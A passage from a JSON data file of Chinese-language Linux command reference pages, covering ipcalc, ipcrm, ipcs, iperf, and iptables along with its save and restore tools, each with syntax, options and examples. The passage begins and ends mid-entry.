--icmpv6-type 143 -s fe80::/10 -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type 151 -s fe80::/10 -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type 152 -s fe80::/10 -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type 153 -s fe80::/10 -j ACCEPT\n-A ICMPv6 -j RETURN\n-A OUTPUT -p icmpv6 -j ACCEPT\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ipcalc",
        "des": "简单的IP地址计算器",
        "body": "<h1 id=\"ipcalc\">ipcalc</h1>\n<p>简单的IP地址计算器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ipcalc命令</strong> 是一个简单的ip地址计算器，可以完成简单的IP地址计算任务。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ipcalc</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b：由给定的IP地址和网络掩码计算出广播地址；</span>\n<span class=\"hljs-deletion\">-h：显示给定UP地址所对应的主机名；</span>\n<span class=\"hljs-deletion\">-m：由给定的IP地址计算器网络掩码；</span>\n<span class=\"hljs-deletion\">-p：显示给定的掩码或IP地址的前缀；</span>\n<span class=\"hljs-deletion\">-n：由给定的IP地址和网络掩码计算网络地址；</span>\n<span class=\"hljs-deletion\">-s：安静模式；</span>\n<span class=\"hljs-deletion\">--help：显示帮助信息。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-section\">[root@localhost ~]</span><span class=\"hljs-comment\"># ipcalc -p 192.168.2.1 255.255.255.0</span>\n<span class=\"hljs-attr\">PREFIX</span>=<span class=\"hljs-number\">24</span>\n\n<span class=\"hljs-section\">[root@localhost ~]</span><span class=\"hljs-comment\"># ipcalc -n 192.168.2.1 255.255.255.0</span>\n<span class=\"hljs-attr\">NETWORK</span>=<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">2.0</span>\n\n<span class=\"hljs-section\">[root@localhost ~]</span><span class=\"hljs-comment\"># ipcalc -h 127.0.0.1</span>\n<span class=\"hljs-attr\">hostname</span>=localhost.localdomain\n\n<span class=\"hljs-section\">[root@localhost ~]</span><span class=\"hljs-comment\"># ipcalc -m 192.168.2.1</span>\n<span class=\"hljs-attr\">NETMASK</span>=<span class=\"hljs-number\">255.255</span>.<span class=\"hljs-number\">255.0</span>\n\n<span class=\"hljs-section\">[root@localhost ~]</span><span class=\"hljs-comment\"># ipcalc -pnbm 192.168.2.1 255.255.255.0</span>\n<span class=\"hljs-attr\">NETMASK</span>=<span class=\"hljs-number\">255.255</span>.<span class=\"hljs-number\">255.0</span>\n<span class=\"hljs-attr\">PREFIX</span>=<span class=\"hljs-number\">24</span>\n<span class=\"hljs-attr\">BROADCAST</span>=<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">2.255</span>\n<span class=\"hljs-attr\">NETWORK</span>=<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">2.0</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ipcrm",
        "des": "删除消息队列、信号集、或者共享内存标识",
        "body": "<h1 id=\"ipcrm\">ipcrm</h1>\n<p>删除消息队列、信号集、或者共享内存标识</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ipcrm命令</strong> 用来删除一个或更多的消息队列、信号量集或者共享内存标识。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">ipcrm <span class=\"hljs-selector-attr\">[ -m SharedMemoryID ]</span> <span class=\"hljs-selector-attr\">[ -M SharedMemoryKey ]</span> <span class=\"hljs-selector-attr\">[ -q MessageID ]</span> <span class=\"hljs-selector-attr\">[ -Q MessageKey ]</span> <span class=\"hljs-selector-attr\">[ -s SemaphoreID ]</span> <span class=\"hljs-selector-attr\">[ -S SemaphoreKey ]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-m SharedMemory id 删除共享内存标识 SharedMemoryID。与 SharedMemoryID 有关联的共享内存段以及数据结构都会在最后一次拆离操作后删除。</span>\n<span class=\"hljs-deletion\">-M SharedMemoryKey 删除用关键字 SharedMemoryKey 创建的共享内存标识。与其相关的共享内存段和数据结构段都将在最后一次拆离操作后删除。</span>\n<span class=\"hljs-deletion\">-q MessageID 删除消息队列标识 MessageID 和与其相关的消息队列和数据结构。</span>\n<span class=\"hljs-deletion\">-Q MessageKey 删除由关键字 MessageKey 创建的消息队列标识和与其相关的消息队列和数据结构。</span>\n<span class=\"hljs-deletion\">-s SemaphoreID 删除信号量标识 SemaphoreID 和与其相关的信号量集及数据结构。</span>\n<span class=\"hljs-deletion\">-S SemaphoreKey 删除由关键字 SemaphoreKey 创建的信号标识和与其相关的信号量集和数据结构。</span>\n</code></pre>\n<p>msgctl、shmctl 和 semctl 子例程提供了删除操作的细节。标识和关键字可以用 ipcs 命令找到。</p>\n<h3 id=\"示例\">示例</h3>\n<p>如果要删除和 SharedMemoryID 18602 相关的共享内存段，请输入：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ipcrm</span> -m <span class=\"hljs-number\">18602</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ipcs",
        "des": "分析消息队列共享内存和信号量 ",
        "body": "<h1 id=\"ipcs\">ipcs</h1>\n<p>分析消息队列共享内存和信号量 </p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ipcs命令</strong> 用于报告Linux中进程间通信设施的状态，显示的信息包括消息列表、共享内存和信号量的信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ipcs</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：显示全部可显示的信息；</span>\n<span class=\"hljs-deletion\">-q：显示活动的消息队列信息；</span>\n<span class=\"hljs-deletion\">-m：显示活动的共享内存信息；</span>\n<span class=\"hljs-deletion\">-s：显示活动的信号量信息。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">ipcs -a\n------ Shared Memory Segments --------\nkey        shmid      owner      perms      bytes      nattch     status      \n<span class=\"hljs-number\">0</span>x7401833d <span class=\"hljs-number\">2654208</span>    root      <span class=\"hljs-number\">600</span>        <span class=\"hljs-number\">4</span>          <span class=\"hljs-number\">0</span>                       \n<span class=\"hljs-number\">0x00000000</span> <span class=\"hljs-number\">3145729</span>    root      <span class=\"hljs-number\">600</span>        <span class=\"hljs-number\">4194304</span>    <span class=\"hljs-number\">9</span>          dest         \n<span class=\"hljs-number\">0</span>x7401833c <span class=\"hljs-number\">2621442</span>    root      <span class=\"hljs-number\">600</span>        <span class=\"hljs-number\">4</span>          <span class=\"hljs-number\">0</span>                       \n<span class=\"hljs-number\">0</span>xd201012b <span class=\"hljs-number\">3080195</span>    root      <span class=\"hljs-number\">600</span>        <span class=\"hljs-number\">1720</span>       <span class=\"hljs-number\">2</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "iperf",
        "des": "网络性能测试工具",
        "body": "<h1 id=\"iperf\">iperf</h1>\n<p>网络性能测试工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>iperf命令</strong> 是一个网络性能测试工具。iperf可以测试TCP和UDP带宽质量。iperf可以测量最大TCP带宽，具有多种参数和UDP特性。iperf可以报告带宽，延迟抖动和数据包丢失。利用iperf这一特性，可以用来测试一些网络设备如路由器，防火墙，交换机等的性能。</p>\n<p>iperf分为两种版本，Unix/Linux版和Windows版，Unix/Linux版更新比较快，版本最新。Windows版更新慢。Windows版的iperf叫jperf，或者xjperf。jperf是在iperf基础上开发了更好的UI和新的功能。</p>\n<p>Linux版本下载地址：<a href=\"http://code.google.com/p/iperf/downloads/list\">http://code.google.com/p/iperf/downloads/list</a></p>\n<h3 id=\"安装iperf\">安装iperf</h3>\n<p>对于windows版的iperf，直接将解压出来的iperf.exe和cygwin1.dll复制到%systemroot%目录即可，对于linux版的iperf，请使用如下命令安装：</p>\n<pre><code class=\"language-shell\">gunzip -c iperf-&lt;<span class=\"hljs-keyword\">version</span>&gt;<span class=\"hljs-string\">.tar.gz</span> | tar -xvf -\n<span class=\"hljs-keyword\">cd</span> iperf-&lt;<span class=\"hljs-keyword\">version</span>&gt;\n<span class=\"hljs-string\">./configure</span>\nmake\nmake install\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<table>\n<tbody>\n<tr>\n<th>命令行选项</th>\n<th>描述</th>\n</tr>\n<tr>\n<td>客户端与服务器共用选项</td>\n</tr>\n<tr>\n<td>-f, --format [bkmaBKMA]</td>\n<td>格式化带宽数输出。支持的格式有：  \n'b' = bits/sec 'B' = Bytes/sec  \n'k' = Kbits/sec 'K' = KBytes/sec  \n'm' = Mbits/sec 'M' = MBytes/sec  \n'g' = Gbits/sec 'G' = GBytes/sec  \n'a' = adaptive bits/sec 'A' = adaptive Bytes/sec  \n自适应格式是kilo-和mega-二者之一。除了带宽之外的字段都输出为字节，除非指定输出的格式，默认的参数是a。  \n注意：在计算字节byte时，Kilo = 1024， Mega = 1024^2，Giga = 1024^3。通常，在网络中，Kilo = 1000， Mega = 1000^2， and Giga = 1000^3，所以，Iperf也按此来计算比特（位）。如果这些困扰了你，那么请使用-f b参数，然后亲自计算一下。</td>\n</tr>\n<tr>\n<td>-i, --interval #</td>\n<td>设置每次报告之间的时间间隔，单位为秒。如果设置为非零值，就会按照此时间间隔输出测试报告。默认值为零。</td>\n</tr>\n<tr>\n<td>-l, --len #[KM]</td>\n<td>设置读写缓冲区的长度。TCP方式默认为8KB，UDP方式默认为1470字节。</td>\n</tr>\n<tr>\n<td>-m, --print_mss</td>\n<td>输出TCP MSS值（通过TCP_MAXSEG支持）。MSS值一般比MTU值小40字节。通常情况</td>\n</tr>\n<tr>\n<td>-p, --port #</td>\n<td>设置端口，与服务器端的监听端口一致。默认是5001端口，与ttcp的一样。</td>\n</tr>\n<tr>\n<td>-u, --udp</td>\n<td>使用UDP方式而不是TCP方式。参看-b选项。</td>\n</tr>\n<tr>\n<td>-w, --window #[KM]</td>\n<td>设置套接字缓冲区为指定大小。对于TCP方式，此设置为TCP窗口大小。对于UDP方式，此设置为接受UDP数据包的缓冲区大小，限制可以接受数据包的最大值。</td>\n</tr>\n<tr>\n<td>-B, --bind host</td>\n<td>绑定到主机的多个地址中的一个。对于客户端来说，这个参数设置了出栈接口。对于服务器端来说，这个参数设置入栈接口。这个参数只用于具有多网络接口的主机。在Iperf的UDP模式下，此参数用于绑定和加入一个多播组。使用范围在224.0.0.0至239.255.255.255的多播地址。参考-T参数。</td>\n</tr>\n<tr>\n<td>-C, --compatibility</td>\n<td>与低版本的Iperf使用时，可以使用兼容模式。不需要两端同时使用兼容模式，但是强烈推荐两端同时使用兼容模式。某些情况下，使用某些数据流可以引起1.7版本的服务器端崩溃或引起非预期的连接尝试。</td>\n</tr>\n<tr>\n<td>-M, --mss #ip头减去40字节。在以太网中，MSS值 为1460字节（MTU1500字节）。许多操作系统不支持此选项。</td>\n</tr>\n<tr>\n<td>-N, --nodelay</td>\n<td>设置TCP无延迟选项，禁用Nagle's运算法则。通常情况此选项对于交互程序，例如telnet，是禁用的。</td>\n</tr>\n<tr>\n<td>-V (from v1.6 or higher)</td>\n<td>绑定一个IPv6地址。  \n服务端：$ iperf -s –V  \n客户端：$ iperf -c <server ipv6=\"\" address=\"\"> -V  \n注意：在1.6.3或更高版本中，指定IPv6地址不需要使用-B参数绑定，在1.6之前的版本则需要。在大多数操作系统中，将响应IPv4客户端映射的IPv4地址。</server></td>\n</tr>\n<tr>\n<td>服务器端专用选项</td>\n</tr>\n<tr>\n<td>-s, --server</td>\n<td>Iperf服务器模式</td>\n</tr>\n<tr>\n<td>-D (v1.2或更高版本)</td>\n<td>Unix平台下Iperf作为后台守护进程运行。在Win32平台下，Iperf将作为服务运行。</td>\n</tr>\n<tr>\n<td>-R(v1.2或更高版本，仅用于Windows)</td>\n<td>卸载Iperf服务（如果它在运行）。</td>\n</tr>\n<tr>\n<td>-o(v1.2或更高版本，仅用于Windows)</td>\n<td>重定向输出到指定文件</td>\n</tr>\n<tr>\n<td>-c, --client host</td>\n<td>如果Iperf运行在服务器模式，并且用-c参数指定一个主机，那么Iperf将只接受指定主机的连接。此参数不能工作于UDP模式。</td>\n</tr>\n<tr>\n<td>-P, --parallel #</td>\n<td>服务器关闭之前保持的连接数。默认是0，这意味着永远接受连接。</td>\n</tr>\n<tr>\n<td>客户端专用选项</td>\n</tr>\n<tr>\n<td>-b, --bandwidth #[KM]</td>\n<td>UDP模式使用的带宽，单位bits/sec。此选项与-u选项相关。默认值是1 Mbit/sec。</td>\n</tr>\n<tr>\n<td>-c, --client host</td>\n<td>运行Iperf的客户端模式，连接到指定的Iperf服务器端。</td>\n</tr>\n<tr>\n<td>-d, --dualtest</td>\n<td>运行双测试模式。这将使服务器端反向连接到客户端，使用-L 参数中指定的端口（或默认使用客户端连接到服务器端的端口）。这些在操作的同时就立即完成了。如果你想要一个交互的测试，请尝试-r参数。</td>\n</tr>\n<tr>\n<td>-n, --num #[KM]</td>\n<td>传送的缓冲器数量。通常情况，Iperf按照10秒钟发送数据。-n参数跨越此限制，按照指定次数发送指定长度的数据，而不论该操作耗费多少时间。参考-l与-t选项。</td>\n</tr>\n<tr>\n<td>-r, --tradeoff</td>\n<td>往复测试模式。当客户端到服务器端的测试结束时，服务器端通过-l选项指定的端口（或默认为客户端连接到服务器端的端口），反向连接至客户端。当客户端连接终止时，反向连接随即开始。如果需要同时进行双向测试，请尝试-d参数。</td>\n</tr>\n<tr>\n<td>-t, --time #</td>\n<td>设置传输的总时间。Iperf在指定的时间内，重复的发送指定长度的数据包。默认是10秒钟。参考-l与-n选项。</td>\n</tr>\n<tr>\n<td>-L, --listenport #</td>\n<td>指定服务端反向连接到客户端时使用的端口。默认使用客户端连接至服务端的端口。</td>\n</tr>\n<tr>\n<td>-P, --parallel #</td>\n<td>线程数。指定客户端与服务端之间使用的线程数。默认是1线程。需要客户端与服务器端同时使用此参数。</td>\n</tr>\n<tr>\n<td>-S, --tos #</td>\n<td>出栈数据包的服务类型。许多路由器忽略TOS字段。你可以指定这个值，使用以\"0x\"开始的16进制数，或以\"0\"开始的8进制数或10进制数。  \n例如，16进制'0x10' = 8进制'020' = 十进制'16'。TOS值1349就是：  \nIPTOS_LOWDELAY minimize delay 0x10  \nIPTOS_THROUGHPUT maximize throughput 0x08  \nIPTOS_RELIABILITY maximize reliability 0x04  \nIPTOS_LOWCOST minimize cost 0x02</td>\n</tr>\n<tr>\n<td>-T, --ttl #</td>\n<td>出栈多播数据包的TTL值。这本质上就是数据通过路由器的跳数。默认是1，链接本地。</td>\n</tr>\n<tr>\n<td>-F (from v1.2 or higher)</td>\n<td>使用特定的数据流测量带宽，例如指定的文件。  \n$ iperf -c <server address=\"\"> -F <file-name></file-name></server></td>\n</tr>\n<tr>\n<td>-I (from v1.2 or higher)</td>\n<td>与-F一样，由标准输入输出文件输入数据。</td>\n</tr>\n<tr>\n<td>杂项</td>\n</tr>\n<tr>\n<td>-h, --help</td>\n<td>显示命令行参考并退出 。</td>\n</tr>\n<tr>\n<td>-v, --version</td>\n<td>显示版本信息和编译信息并退出。</td>\n</tr>\n</tbody>\n</table>\n\n<h3 id=\"实例\">实例</h3>\n<p>带宽测试通常采用UDP模式，因为能测出极限带宽、时延抖动、丢包率。在进行测试时，首先以链路理论带宽作为数据发送速率进行测试，例如，从客户端到服务器之间的链路的理论带宽为100Mbps，先用<code>-b 100M</code>进行测试，然后根据测试结果（包括实际带宽，时延抖动和丢包率），再以实际带宽作为数据发送速率进行测试，会发现时延抖动和丢包率比第一次好很多，重复测试几次，就能得出稳定的实际带宽。</p>\n<p> <strong>UDP模式</strong> </p>\n<p>服务器端：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">iperf -u -s</span>\n</code></pre>\n<p>客户端：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">iperf</span> -u -c <span class=\"hljs-number\">192.168.1.1</span> -b <span class=\"hljs-number\">100</span>M -t <span class=\"hljs-number\">60</span>\n</code></pre>\n<p>在udp模式下，以100Mbps为数据发送速率，客户端到服务器192.168.1.1上传带宽测试，测试时间为60秒。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">iperf</span> -u -c <span class=\"hljs-number\">192.168.1.1</span> -b <span class=\"hljs-number\">5</span>M -P <span class=\"hljs-number\">30</span> -t <span class=\"hljs-number\">60</span>\n</code></pre>\n<p>客户端同时向服务器端发起30个连接线程，以5Mbps为数据发送速率。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">iperf</span> -u -c <span class=\"hljs-number\">192.168.1.1</span> -b <span class=\"hljs-number\">100</span>M -d -t <span class=\"hljs-number\">60</span>\n</code></pre>\n<p>以100M为数据发送速率，进行上下行带宽测试。</p>\n<p> <strong>TCP模式</strong> </p>\n<p>服务器端：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">iperf -s</span>\n</code></pre>\n<p>客户端：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">iperf</span> -c <span class=\"hljs-number\">192.168.1.1</span> -t <span class=\"hljs-number\">60</span>\n</code></pre>\n<p>在tcp模式下，客户端到服务器192.168.1.1上传带宽测试，测试时间为60秒。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">iperf</span> -c <span class=\"hljs-number\">192.168.1.1</span>  -P <span class=\"hljs-number\">30</span> -t <span class=\"hljs-number\">60</span>\n</code></pre>\n<p>客户端同时向服务器端发起30个连接线程。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">iperf</span> -c <span class=\"hljs-number\">192.168.1.1</span>  -d -t <span class=\"hljs-number\">60</span>\n</code></pre>\n<p>进行上下行带宽测试。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "iptables-restore",
        "des": "还原iptables表的配置",
        "body": "<h1 id=\"iptables-restore\">iptables-restore</h1>\n<p>还原iptables表的配置</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>iptables-restore命令</strong> 用来还原iptables-save命令所备份的iptables配置。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">iptables-restore</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c：指定在还原iptables表时候，还原当前的数据包计数器和字节计数器的值；</span>\n<span class=\"hljs-deletion\">-t：指定要还原表的名称。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">iptables-<span class=\"hljs-built_in\">restore</span> &lt; iptables.bak\n</code></pre>\n<p>iptables.bak是iptables-save命令所备份的文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "iptables-save",
        "des": "备份iptables的表配置",
        "body": "<h1 id=\"iptables-save\">iptables-save</h1>\n<p>备份iptables的表配置</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>iptables-save命令</strong> 用于将linux内核中的iptables表导出到标准输出设备商，通常，使用shell中I/O重定向功能将其输出保存到指定文件中。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">iptables-save</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c：指定要保存的iptables表时，保存当权的数据包计算器和字节计数器的值；</span>\n<span class=\"hljs-deletion\">-t：指定要保存的表的名称。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root@localhost ~]# iptables-save -t filter &gt; iptables.bak\n[root@localhost ~]# cat iptables.bak\n# Generated by iptables-save v1.3.5 on Thu Dec 26 21:25:15 2013\n*filter\n<span class=\"hljs-meta\">:INPUT DROP [48113:2690676]</span>\n<span class=\"hljs-meta\">:FORWARD accept [0:0]</span>\n<span class=\"hljs-meta\">:OUTPUT ACCEPT [3381959:1818595115]</span>\n-A INPUT -i lo -j ACCEPT\n-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT\n-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT\n-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT\n-A INPUT -p icmp -j ACCEPT\n-A OUTPUT -o lo -j ACCEPT\nCOMMIT\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "iptables",
        "des": "Linux上常用的防火墙软件",
        "body": "<h1 id=\"iptables\">iptables</h1>\n<p>Linux上常用的防火墙软件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>iptables命令</strong> 是Linux上常用的防火墙软件，是netfilter项目的一部分。可以直接配置，也可以通过许多前端和图形界面配置。</p>\n<!-- TOC -->\n\n<ul>\n<li><a href=\"#%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E\">补充说明</a><ul>\n<li><a href=\"#%E8%AF%AD%E6%B3%95\">语法</a></li>\n<li><a href=\"#%E9%80%89%E9%A1%B9\">选项</a></li>\n</ul>\n</li>\n<li><a href=\"#%E5%9F%BA%E6%9C%AC%E5%8F%82%E6%95%B0\">基本参数</a><ul>\n<li><a href=\"#%E5%91%BD%E4%BB%A4%E9%80%89%E9%A1%B9%E8%BE%93%E5%85%A5%E9%A1%BA%E5%BA%8F\">命令选项输入顺序</a></li>\n<li><a href=\"#%E5%B7%A5%E4%BD%9C%E6%9C%BA%E5%88%B6\">工作机制</a></li>\n<li><a href=\"#%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E7%AD%96%E7%95%A5\">防火墙的策略</a></li>\n<li><a href=\"#%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E7%AD%96%E7%95%A5-1\">防火墙的策略</a></li>\n<li><a href=\"#%E5%AE%9E%E4%BE%8B\">实例</a><ul>\n<li><a href=\"#%E6%B8%85%E7%A9%BA%E5%BD%93%E5%89%8D%E7%9A%84%E6%89%80%E6%9C%89%E8%A7%84%E5%88%99%E5%92%8C%E8%AE%A1%E6%95%B0\">清空当前的所有规则和计数</a></li>\n<li><a href=\"#%E9%85%8D%E7%BD%AE%E5%85%81%E8%AE%B8ssh%E7%AB%AF%E5%8F%A3%E8%BF%9E%E6%8E%A5\">配置允许ssh端口连接</a></li>\n<li><a href=\"#%E5%85%81%E8%AE%B8%E6%9C%AC%E5%9C%B0%E5%9B%9E%E7%8E%AF%E5%9C%B0%E5%9D%80%E5%8F%AF%E4%BB%A5%E6%AD%A3%E5%B8%B8%E4%BD%BF%E7%94%A8\">允许本地回环地址可以正常使用</a></li>\n<li><a href=\"#%E8%AE%BE%E7%BD%AE%E9%BB%98%E8%AE%A4%E7%9A%84%E8%A7%84%E5%88%99\">设置默认的规则</a></li>\n<li><a href=\"#%E9%85%8D%E7%BD%AE%E7%99%BD%E5%90%8D%E5%8D%95\">配置白名单</a></li>\n<li><a href=\"#%E5%BC%80%E5%90%AF%E7%9B%B8%E5%BA%94%E7%9A%84%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3\">开启相应的服务端口</a></li>\n<li><a href=\"#%E4%BF%9D%E5%AD%98%E8%A7%84%E5%88%99%E5%88%B0%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD\">保存规则到配置文件中</a></li>\n<li><a href=\"#%E5%88%97%E5%87%BA%E5%B7%B2%E8%AE%BE%E7%BD%AE%E7%9A%84%E8%A7%84%E5%88%99\">列出已设置的规则</a></li>\n<li><a href=\"#%E6%B8%85%E9%99%A4%E5%B7%B2%E6%9C%89%E8%A7%84%E5%88%99\">清除已有规则</a></li>\n<li><a href=\"#%E5%88%A0%E9%99%A4%E5%B7%B2%E6%B7%BB%E5%8A%A0%E7%9A%84%E8%A7%84%E5%88%99\">删除已添加的规则</a></li>\n<li><a href=\"#%E5%BC%80%E6%94%BE%E6%8C%87%E5%AE%9A%E7%9A%84%E7%AB%AF%E5%8F%A3\">开放指定的端口</a></li>\n<li><a href=\"#%E5%B1%8F%E8%94%BDip\">屏蔽IP</a></li>\n<li><a href=\"#%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%8C%85%E5%87%BA%E5%8E%BB%E7%9A%84%E7%BD%91%E7%BB%9C%E6%8E%A5%E5%8F%A3\">指定数据包出去的网络接口</a></li>\n<li><a href=\"#%E6%9F%A5%E7%9C%8B%E5%B7%B2%E6%B7%BB%E5%8A%A0%E7%9A%84%E8%A7%84%E5%88%99\">查看已添加的规则</a></li>\n<li><a href=\"#%E5%90%AF%E5%8A%A8%E7%BD%91%E7%BB%9C%E8%BD%AC%E5%8F%91%E8%A7%84%E5%88%99\">启动网络转发规则</a></li>\n<li><a href=\"#%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84\">端口映射</a></li>\n<li><a href=\"#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D\">字符串匹配</a></li>\n<li><a href=\"#%E9%98%BB%E6%AD%A2windows%E8%A0%95%E8%99%AB%E7%9A%84%E6%94%BB%E5%87%BB\">阻止Windows蠕虫的攻击</a></li>\n<li><a href=\"#%E9%98%B2%E6%AD%A2syn%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB\">防止SYN洪水攻击</a></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<!-- /TOC -->\n\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">iptables</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-t, --<span class=\"hljs-selector-tag\">table</span> <span class=\"hljs-selector-tag\">table</span> 对指定的表 <span class=\"hljs-selector-tag\">table</span> 进行操作， <span class=\"hljs-selector-tag\">table</span> 必须是 raw， nat，<span class=\"hljs-attribute\">filter</span>，mangle 中的一个。如果不指定此选项，默认的是 <span class=\"hljs-attribute\">filter</span> 表。\n\n# 通用匹配：源地址目标地址的匹配\n-<span class=\"hljs-selector-tag\">p</span>：指定要匹配的数据包协议类型；\n-s, --source <span class=\"hljs-selector-attr\">[!]</span> <span class=\"hljs-selector-tag\">address</span><span class=\"hljs-selector-attr\">[/mask]</span> ：把指定的一个／一组地址作为源地址，按此规则进行过滤。当后面没有 <span class=\"hljs-attribute\">mask</span> 时，<span class=\"hljs-selector-tag\">address</span> 是一个地址，比如：<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">1.1</span>；当 <span class=\"hljs-attribute\">mask</span> 指定时，可以表示一组范围内的地址，比如：<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">1.0</span>/<span class=\"hljs-number\">255.255</span>.<span class=\"hljs-number\">255.0</span>。\n-d, --destination <span class=\"hljs-selector-attr\">[!]</span> <span class=\"hljs-selector-tag\">address</span><span class=\"hljs-selector-attr\">[/mask]</span> ：地址格式同上，但这里是指定地址为目的地址，按此进行过滤。\n-<span class=\"hljs-selector-tag\">i</span>, --in-interface <span class=\"hljs-selector-attr\">[!]</span> &lt;网络接口name&gt; ：指定数据包的来自来自网络接口，比如最常见的 eth0 。注意：它只对 <span class=\"hljs-selector-tag\">INPUT</span>，FORWARD，PREROUTING 这三个链起作用。如果没有指定此选项， 说明可以来自任何一个网络接口。同前面类似，\"!\" 表示取反。\n-o, --out-interface <span class=\"hljs-selector-attr\">[!]</span> &lt;网络接口name&gt; ：指定数据包出去的网络接口。只对 OUTPUT，FORWARD，POSTROUTING 三个链起作用。\n\n# 查看管理命令\n-L, --list <span class=\"hljs-selector-attr\">[chain]</span> 列出链 chain 上面的所有规则，如果没有指定链，列出表上所有链的所有规则。\n\n# 规则管理命令\n-<span class=\"hljs-selector-tag\">A</span>, --append chain rule-specification 在指定链 chain 的末尾插入指定的规则，也就是说，这条规则会被放到最后，最后才会被执行。规则是由后面的匹配来指定。\n-<span class=\"hljs-selector-tag\">I</span>, --insert chain <span class=\"hljs-selector-attr\">[rulenum]</span> rule-specification 在链 chain 中的指定位置插入一条或多条规则。如果指定的规则号是<span class=\"hljs-number\">1</span>，则在链的头部插入。这也是默认的情况，如果没有指定规则号。\n-D, --delete chain rule-specification -D, --delete chain rulenum 在指定的链 chain 中删除一个或多个指定规则。\n-R num：Replays替换/修改第几条规则\n\n# 链管理命令（这都是立即生效的）\n-<span class=\"hljs-selector-tag\">P</span>, --policy chain target ：为指定的链 chain 设置策略 target。注意，只有内置的链才允许有策略，用户自定义的是不允许的。\n-F, --flush <span class=\"hljs-selector-attr\">[chain]</span> 清空指定链 chain 上面的所有规则。如果没有指定链，清空该表上所有链的所有规则。\n-N, --new-chain chain 用指定的名字创建一个新的链。\n-X, --delete-chain <span 